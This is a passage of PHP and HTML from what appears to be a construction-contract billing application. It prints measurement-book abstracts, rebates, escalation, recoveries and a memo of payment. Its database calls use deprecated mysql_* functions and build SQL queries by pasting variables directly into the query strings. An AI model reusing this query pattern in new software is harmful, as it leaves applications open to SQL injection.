						$Arrkey2 = array_search($MeasurementbookidDpm, $SlmArrMbidList);
						$QtyDpmSlm_4 = $SlmArrQuantityList[$Arrkey2];
						$PercDpmSlm_4 = $SlmArrPayPercentList[$Arrkey2];
						$Dpm_Slm_Amount_4 = $QtyDpmSlm_4 * $PercDpmSlm_4 * $rate /100;
					}
					$total_percent_dpm_slm_4 = $paymentpercent_dpm + $PercDpmSlm_4;
?>
				<tr border='1' bgcolor="#FFFFFF" class="labelprint">
					<td  align='right' width='' class=''><?php echo number_format($dpmqty, $decimal, '.', ''); ?></td>
					<td  align='right' width='' class=''><?php echo number_format($dpmamt, 2, '.', ''); $dpm_amount_item  = $dpm_amount_item + $dpmamt; ?></td>
					<?php 
					if($dummy == 0) 
					{
					?>
						<td  align='right' width='' class=''></td>
						<td  align='right' width='' class=''>
							<?php 
								if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
								{
									echo number_format($Dpm_Slm_Amount_4, 2, '.', '');
									$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_4;
								}
							 ?>
						</td>
						<td  align='center' width='' class='' rowspan="" style="font-size:9px;">
							<?php
								//if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
								//{
									echo $total_percent_dpm_slm_4."% Paid";
								//}
							?>
						</td>
					<?php 
					} 
					?>
				</tr>
<?php	
				$rowcount++;
				}
			}
			//$Line = $Line + $dpm_cnt;//echo "C = ".$dpm_cnt."<br/>";
			// if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";}
			$DpmTemp++; 
		}
		//$rowcount++;
	}
//*************THIS PART IS FOR " PRINT " ---- SINCE LAST MEASUREMENT ( S.L.M. ) SECTION*******************//
?>
<?php
	$slm_dpm_str = $slm_measurement_qty."*".$dpm_measurement_qty;
	$mbooktype_query = "select flag from mbookgenerate WHERE subdivid = '$subdivisionlist[$i]' AND sheetid = '$abstsheetid'";
	$mbooktype_sql = mysql_query($mbooktype_query);
	$flagtype = @mysql_result($mbooktype_sql,0,'flag');
	if($flagtype == 1) { $mbookdescription = "/MBook No. "; }
	if($flagtype == 2) { $mbookdescription = "/MBook No. "; }

	if($slm_cnt > 0)
	{
		$eplodeslm = explode("*", rtrim($slm_mesurementbook_details,"*"));
		//echo "B = ".count($eplodeslm)."<br/>";
		for($x3=0; $x3<count($eplodeslm); $x3+=12)
		{
			$slmqty = $eplodeslm[$x3+1];
			
			$remarks = $eplodeslm[$x3+10];
			$paymentpercent = $eplodeslm[$x3+7];
			$slmamt = $slmqty * $rate * $paymentpercent / 100;
			$slm_amount_item = $slm_amount_item + $slmamt;
			if($x3 == 0)
			{
?>
		<tr border='1' bgcolor="#FFFFFF" class="labelprint">
			<td  align='left' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='left' width='' class='' style="font-size:10px;" rowspan="<?php echo $slm_cnt; ?>"><?php echo "Qty Vide P ".$mbpageno_slm.$mbookdescription.$mbookno_slm; ?></td>
			<td  align='right' width='' class='' rowspan="<?php echo $slm_cnt; ?>"><?php echo number_format($slm_measurement_qty, $decimal, '.', ''); ?></td>
			<td  align='left' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='left' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='right' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='left' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='right' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='right' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='right' width='' class=''>
				<?php 
					echo number_format($slmqty, $decimal, '.', ''); 
				?>
			</td>
			<td  align='right' width='' class=''>
				<?php 
					echo number_format($slmamt, 2, '.', ''); 
				?>
			</td>
			<td  align='center' width='' class='' style="font-size:9px;">
				<?php 
				if($paymentpercent<100)
				{
					echo $paymentpercent."% Paid";
				} 
				?>
			</td>
		</tr>
<?php
			}
			if(($slm_cnt > 1) && ($x3 != 0))
			{
			
?>
		<tr border='1' bgcolor="#FFFFFF" class="labelprint">
			<td  align='right' width='' class=''><?php echo number_format($slmqty, $decimal, '.', ''); ?></td>
			<td  align='right' width='' class=''><?php echo number_format($slmamt, 2, '.', ''); ?></td>
			<td  align='center' width='' class='' style="font-size:9px;"><?php echo $paymentpercent."% Paid"; ?></td>
		</tr>
<?php
			$rowcount++;
			}
		}
	$rowcount++; //$Line = $Line + $slm_cnt;//echo "C = ".$slm_cnt."<br/>";
	 //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";}
	}
	if($PartPayremarks != "")
	{
?>
		<tr border='1' class="labelprint" style="font-size:10px;">
			<td colspan="12" align="left" bgcolor="">Remarks &nbsp; :&nbsp;&nbsp;&nbsp;  <?php echo $PartPayremarks; ?></td>
		</tr>
<?php	
		$rowcount++; $Line++;//echo "E = ".$Line."<br/>";
		// if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";}
	}	
//*************THIS PART IS FOR " PRINT " ---- TOTAL PART ( S.L.M. + D.P.M ) SECTION*******************//	
$total_qty_item = $dpm_measurement_qty + $slm_measurement_qty;
$total_amt_item = $slm_amount_item + $dpm_amount_item;
?>
	<tr border='1' class="labelprint" bgcolor="">
		<!--<td  align='left' width='3%' class=' label' style="border-bottom-color:#666666">&nbsp;</td>-->
		<td  align='left' width='' class=''>&nbsp;<?php //echo $Line; ?></td>
		<td  align='right' width='' class='labelbold'>TOTAL</td>
		<td  align='right' width='' class=''>
		<?php echo number_format($total_qty_item, $decimal, '.', ''); ?>
		</td>
		<td  align='right' width='' class=''>
		<?php echo $rate; ?>
		</td>
		<td  align='left' width='' class=''>
		<?php echo $unit; ?>
		</td>
		<td  align='right' width='' class=''>
		<?php echo number_format($total_amt_item, 2, '.', ''); ?>
		</td>
		<td  align='left' width='' class=''>&nbsp;</td>
		<td  align='right' width='' class=''>
		<?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?>
		</td>
		<td  align='right' width='' class=''>
		<?php echo number_format($dpm_amount_item, 2, '.', ''); ?>
		</td>
		<td  align='right' width='' class=''>
		<?php echo number_format($slm_measurement_qty, $decimal, '.', ''); ?>
		</td>
		<td  align='right' width='' class=''>
		<?php echo number_format($slm_amount_item, 2, '.', ''); ?>
		</td>
		<td  align='right' width='' class=''><?php //echo $Line; ?>&nbsp;</td>
	</tr>
	<?php UpdateItemAbstractPageNo($abstsheetid,$abstmbno,$subdivid,$page); ?>
	<?php  $rowcount++; $Line++;/*echo "F = ".$Line."<br/>";*/ //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} ?>
	<tr bgcolor=""><td colspan="12">&nbsp;</td></tr>
	<?php  $rowcount++; $Line++;/*echo "F = ".$Line."<br/>";*/ //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} ?>
	<!--<tr bgcolor="#d4d8d8" style="height:10px"><td colspan="13" style="border-top-color:#0A9CC5; border-bottom-color:#0A9CC5;"></td></tr>-->
	<input type="hidden" name="row_count" id="row_count<?php echo $table_group_row; ?>" value="<?php echo $rowcount; ?>" />
	<?php //echo $subdivname." = ".$Line." = ".$LineTemp." = ".$Linecheck."<br/>"; ?>
	<?php
	$color_var++; $table_group_row++;
	$AbstractStr			.= $divid."*".$subdivid."*".$fromdate."*".$todate."*".$runn_acc_bill_no."*".$abstsheetid."*".$abstmbno."*".$page."*";
	$OverAllSlmAmount 		=  $OverAllSlmAmount	+	$slm_amount_item; 
	$OverAllDpmAmount 		=  $OverAllDpmAmount	+	$dpm_amount_item; 
	$OverAllSlmDpmAmount 	=  $OverAllSlmDpmAmount	+	$total_amt_item;
}
//echo $Line;	
	$SlmRebateAmount 		=  $OverAllSlmAmount 	* 	$overall_rebate_perc /100;
	$DpmRebateAmount 		=  $OverAllDpmAmount 	* 	$overall_rebate_perc /100;
	$SlmDpmRebateAmount 	=  $OverAllSlmDpmAmount * 	$overall_rebate_perc /100;
	
	$SlmNetAmount 			=  round($OverAllSlmAmount	-	$SlmRebateAmount); 
	$DpmNetAmount 			=  round($OverAllDpmAmount	-	$DpmRebateAmount); 
	$SlmDpmNetAmount 		=  round($OverAllSlmDpmAmount	-	$SlmDpmRebateAmount);
$Linecheck = 3;
$LineTemp = $Line + $Linecheck;
if($LineTemp >= 30){ $Line = 30; } 
if($Line >= 30)
{
?>
<tr>
	<td colspan='3' align='right' class='labelbold'>C/o Page No <?php echo $page+1; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
	<td><?php //echo $Line; ?></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
	<td><?php //echo $LineTemp; ?></td>
</tr>
<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page <?php echo $page; ?></td></tr>
</table>
<p style='page-break-after:always;'></p>
<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
	<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No.<?php echo $abstmbno; ?>&nbsp;&nbsp;</td></tr>
</table>
<?php echo $table; ?>
<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>
<?php echo $tablehead; ?>
<tr>
	<td colspan='3' align='right' class='labelbold'>B/f from Page No <?php echo $page; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
	<td></td>
</tr>
<?php
$Line = $LineIncr; $page++;
}
?>

	<tr class="labelprint" bgcolor="#F0F0F0">
		<td colspan="2" align="right">Total Cost&nbsp;&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px; font-weight:normal;'></i>&nbsp;&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
	</tr>
	<?php $Line++; //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} ?>
	<tr class="labelprint">
		<td colspan="2" align="right">Less: Over All Rebate : <?php echo $overall_rebate_perc; ?>%&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px; font-weight:normal;'></i>&nbsp;&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($SlmDpmRebateAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($DpmRebateAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($SlmRebateAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
	</tr>
	<?php $Line++; //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} ?>
	<tr class="labelbold" bgcolor="#F0F0F0">
		<td colspan="2" align="right">Gross Amount&nbsp;&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format(round($SlmDpmNetAmount), 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($DpmNetAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format(round($SlmNetAmount), 2, '.', ''); ?></td>
		<td>&nbsp;</td>
	</tr>
<?php 
$Line++; //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} 
if($Line >= 30)
{
?>
<tr>
	<td colspan='3' align='right' class='labelbold'>C/o Page No <?php echo $page+1; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
	<td></td>
</tr>
<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page <?php echo $page; ?></td></tr>
</table>
<p style='page-break-after:always;'></p>
<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
	<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No.<?php echo $abstmbno; ?>&nbsp;&nbsp;</td></tr>
</table>
<?php echo $table; ?>
<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>
<?php echo $tablehead; ?>
<tr>
	<td colspan='3' align='right' class='labelbold'>B/f from Page No <?php echo $page; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
	<td></td>
</tr>
<?php
$Line = $LineIncr; $page++;
}
else
{
?>
<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>
<?php
/*while($Line<30)
{
	echo "<br/>";
	$Line++;
}*/
?>
Page <?php echo $page; ?></td></tr>
<?php	
}
?>
</table>
<p style='page-break-after:always;'></p>
<?php 
$EscQtrArray = array();
$EscTccAmtArray = array();
$EscTcaAmtArray = array();
$esc_cnt = 0;
$Esc_Total_Amt = 0;
$select_esc_rbn_query = "select * from escalation where sheetid = '$abstsheetid' and flag = 0 and rbn = '$rbn' ORDER BY quarter ASC";
$select_esc_rbn_sql = mysql_query($select_esc_rbn_query);
if($select_esc_rbn_sql == true)
{
	if(mysql_num_rows($select_esc_rbn_sql)>0)
	{
		$esc_cnt = 1;
		while($EscList = mysql_fetch_object($select_esc_rbn_sql))
		{
			$quarter = $EscList->quarter;
			$esc_tcc_amount = $EscList->tcc_amt;
			$esc_tca_amount = $EscList->tca_amt;
			$esc_qtr_amt = round(($esc_tcc_amount+$esc_tca_amount),2);//$EscList->esc_total_amt;
			
			//$Esc_Total_Amt = $Esc_Total_Amt+$esc_tcc_amount+$esc_tca_amount;
			$Esc_Total_Amt = $Esc_Total_Amt+$esc_qtr_amt;//+$esc_tca_amount;
			
			array_push($EscQtrArray,$quarter);
			array_push($EscTccAmtArray,$esc_qtr_amt);
			//array_push($EscTcaAmtArray,$esc_tca_amount);
		}
	}
}
$Esc_Total_Amt = round($Esc_Total_Amt);
//print_r($EscQtrArray);print_r($EscAmtArray);
$secured_advance_query = "select sec_adv_amount from secured_advance where sheetid = '$abstsheetid' and rbn = '$rbn'";
$secured_advance_sql = mysql_query($secured_advance_query);
if($secured_advance_sql == true)
{
	$SAList 		= 	mysql_fetch_object($secured_advance_sql);
	$sec_adv_amount	= 	$SAList->sec_adv_amount; 
}
else
{
	$sec_adv_amount = 0;
}

$total_recovery = 0;
$water_recovery_query = "select water_cost from generate_waterbill where sheetid = '$abstsheetid' and rbn = '$rbn'";
$water_recovery_sql = mysql_query($water_recovery_query);
if($water_recovery_sql == true)
{
	while($WRList 	= 	mysql_fetch_object($water_recovery_sql))
	{
		$water_charge 	=  $water_charge+$WRList->water_cost; 
	}
}
else
{
	$water_charge = 0;
}
$total_recovery = $total_recovery + $water_charge;
$electricity_recovery_query = "select electricity_cost from generate_electricitybill where sheetid = '$abstsheetid' and rbn = '$rbn'";
$electricity_recovery_sql = mysql_query($electricity_recovery_query);
if($electricity_recovery_sql == true)
{
	while($ERList 	= 	mysql_fetch_object($electricity_recovery_sql))
	{
		$electricity_charge  = 	$electricity_charge+$ERList->electricity_cost;
	}
}
else
{
	$electricity_charge = 0;
}
$total_recovery = $total_recovery + $electricity_charge;
$general_recovery_query = "select * from generate_otherrecovery where sheetid = '$abstsheetid' and rbn = '$rbn'";
//echo $general_recovery_query;
$general_recovery_sql = mysql_query($general_recovery_query);
if($general_recovery_sql == true)
{
	$GRList 			= 	mysql_fetch_object($general_recovery_sql);
	$sd_amt 			= 	round($GRList->sd_amt);
	$sd_percent 		= 	$GRList->sd_percent;
	$wct_amt 			= 	round($GRList->wct_amt);
	$wct_percent 		= 	$GRList->wct_percent;
	$vat_amt 			= 	round($GRList->vat_amt);
	$vat_percent 		= 	$GRList->vat_percent;
	$mob_adv_amt 		= 	round($GRList->mob_adv_amt);
	$mob_adv_percent 	= 	$GRList->mob_adv_percent;
	$lw_cess_amt 		= 	round($GRList->lw_cess_amt);
	$lw_cess_percent 	= 	$GRList->lw_cess_percent;
	$incometax_amt 		= 	round($GRList->incometax_amt);
	$incometax_percent 	= 	$GRList->incometax_percent;
	$it_cess_amt 		= 	round($GRList->it_cess_amt);
	$it_cess_percent 	= 	$GRList->it_cess_percent;
	$it_edu_amt 		= 	round($GRList->it_edu_amt);
	$it_edu_percent 	= 	$GRList->it_edu_percent;
	$land_rent 			= 	round($GRList->land_rent);
	$liquid_damage 		= 	round($GRList->liquid_damage);
	//$other_recovery_1 	= 	round($GRList->other_recovery_1_amt);
	//$other_recovery_2	= 	round($GRList->other_recovery_2_amt);
	$other_recovery_1 	= 	round($GRList->other_recovery_1);
	$other_recovery_2	= 	round($GRList->other_recovery_2);
	$other_recovery_1_desc 	= 	$GRList->other_recovery_1_desc;
	$other_recovery_2_desc	= 	$GRList->other_recovery_2_desc;
	if($other_recovery_1_desc == "")
	{
		$other_recovery_1_desc = "Other Recovery 1 ";
	}
	if($other_recovery_2_desc == "")
	{
		$other_recovery_2_desc = "Other Recovery 2 ";
	}
	$non_dep_machine_equip 	= 	round($GRList->non_dep_machine_equip);
	$non_dep_man_power 	= 	round($GRList->non_dep_man_power);
	$nonsubmission_qa 	= 	round($GRList->nonsubmission_qa);
}
if($non_dep_machine_equip != 0)
{
	$non_dep_machine_equip_print = number_format($non_dep_machine_equip, 2, '.', '');
}
else
{
	$non_dep_machine_equip_print = "NIL";
}

if($non_dep_man_power != 0)
{
	$non_dep_man_power_print = number_format($non_dep_man_power, 2, '.', '');
}
else
{
	$non_dep_man_power_print = "NIL";
}

if($electricity_charge != 0)
{
	$electricity_charge_print = number_format($electricity_charge, 2, '.', '');
}
else
{
	$electricity_charge_print = "NIL";
}

if($water_charge != 0)
{
	$water_charge_print = number_format($water_charge, 2, '.', '');
}
else
{
	$water_charge_print = "NIL";
}
$total_recovery = $total_recovery + $sd_amt+$wct_amt + $vat_amt+$mob_adv_amt + $lw_cess_amt+$incometax_amt + $it_cess_amt+$it_edu_amt + $land_rent+$liquid_damage + $other_recovery_1 + $other_recovery_2 + $non_dep_machine_equip + $non_dep_man_power + $nonsubmission_qa;
$rrcount = 0;  $total_rec_rel_amt = 0;
$RRDescCivArr = array(); $RRAmtCivArr = array(); $RRDescAccArr = array(); $RRAmtAccArr = array();

$recov_release_query = "select * from recovery_release where sheetid = '$abstsheetid' and rbn = '$rbn'";
$recov_release_sql = mysql_query($recov_release_query);
//echo $recov_release_query;
if($recov_release_sql == true)
{
	if(mysql_num_rows($recov_release_sql)>0)
	{
		while($RecRelList = mysql_fetch_object($recov_release_sql))
		{
			$rec_rel_desc_civil = $RecRelList->description_civil;
			$rec_rel_amt_civil 	= $RecRelList->amount_civil;
			$rec_rel_desc_acc 	= $RecRelList->description_acc;
			$rec_rel_amt_acc 	= $RecRelList->amount_acc;
			array_push($RRDescCivArr,$rec_rel_desc_civil);
			array_push($RRAmtCivArr,$rec_rel_amt_civil);
			array_push($RRDescAccArr,$rec_rel_desc_acc);
			array_push($RRAmtAccArr,$rec_rel_amt_acc);
			$total_rec_rel_amt  = $total_rec_rel_amt+$rec_rel_amt_civil;
			$rrcount++;
		}
	}
}

$page++;
$OverAllSlmDpmAmount = round($OverAllSlmDpmAmount);
$OverAllSlmAmount = round($OverAllSlmAmount);
//echo "<p style='page-break-after:always;'></p>";
echo $title;
echo $table;
echo "<table width='1087px' bgcolor='white' cellpadding='3' cellspacing='3' align='center' class='label table1'>";
echo $tablehead;
//echo "<tr><td class='labelprint' align='center' colspan='12'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelbold' align='center' colspan='12'><u>Memo of payment</u></td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>Upto date value of work done : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='5'>".number_format($OverAllSlmDpmAmount, 2, '.', '')."</td><td style='border:none'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>Deduct Previous Paid : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none;'>(-)&nbsp;&nbsp;".number_format($OverAllDpmAmount, 2, '.', '')."</td><td style='border:none;'>&nbsp;</td></tr>";
if(count($EscQtrArray)>0)
{
	for($q1=0; $q1<count($EscQtrArray); $q1++)
	{
		$EQtr = $EscQtrArray[$q1];
		$ETccAmt = $EscTccAmtArray[$q1];
		//$ETcaAmt = $EscTcaAmtArray[$q1];
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>Escalation for Quarter - ".$EQtr." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none;'>&nbsp;&nbsp;".number_format($ETccAmt, 2, '.', '')."</td><td style='border:none;'>&nbsp;</td></tr>";
//echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>10-CA Escalation for Quarter - ".$EQtr." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none;'>&nbsp;&nbsp;".number_format($ETcaAmt, 2, '.', '')."</td><td style='border:none;'>&nbsp;</td></tr>";
	}
}
$OverAllSlmAmount = round($OverAllSlmAmount+$Esc_Total_Amt);

//echo '<hr style="border-top: dotted 1px;" />';
//$OverAllSlmAmount = $OverAllSlmAmount + $sec_adv_amount;
$Overall_net_amt_final = round(($OverAllSlmAmount + $sec_adv_amount + $total_rec_rel_amt - $total_recovery),2);
$Overall_net_amt_final = round($Overall_net_amt_final);

echo "<tr style='border:none'><td style='border:none' class='labelbold' align='right' colspan='6'>Net Amount : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'>  </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td style='border:none; border-top:1px dashed #000000' class='labelbold' align='right' colspan='2'>".number_format($OverAllSlmAmount, 2, '.', '')."</td><td style='border:none; border-top:1px dashed #000000'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>Secured Advance : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none;'>".number_format($sec_adv_amount, 2, '.', '')."</td><td style='border:none;'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td colspan='2' class='labelbold' align='right' style='border:none'>&nbsp;<u>Recoveries</u>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td style='border:none' class='labelbold' align='left' colspan='10'></td></tr>";
$ea = 1; $eb = 1; $ed = 1; 
$ea_text = "<b>Under 8[a]</b>"; $eb_text = "<b>Under 8[b]</b>";  $ec_text = "<b>Under 8[c]</b>";  $ed_text = "<b><u>With hold Amount</u></b>";
if($wct_percent != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ea_text." (".$ea.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>W.C.T @ ".number_format($wct_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($wct_amt, 2, '.', '')."</td><td style='border:none' colspan=''>&nbsp;</td></tr>";
$ea++; $ea_text = "";
}
if($vat_percent != 0)
{


echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ea_text." (".$ea.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>VAT @  ".number_format($vat_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($vat_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
$ea++; $ea_text = "";


}
if($lw_cess_percent != 0)
{


echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ea_text." (".$ea.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Labour Welfare CESS @ ".number_format($lw_cess_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($lw_cess_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
$ea++; $ea_text = "";




}
if($mob_adv_percent != 0)
{
//echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ea_text." (".$ea.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Mobilization Advance @ ".number_format($mob_adv_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($mob_adv_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
//echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ea_text." (".$ea.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Mobilization Advance @ ".number_format($mob_adv_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($mob_adv_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ea_text." (".$ea.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Mobilization Advance : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($mob_adv_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
$ea++; $ea_text = "";
}
if($incometax_percent != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Income Tax @ ".number_format($incometax_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($incometax_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($it_cess_percent != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>IT Cess @ ".number_format($it_cess_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($it_cess_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($it_edu_percent != 0)
{
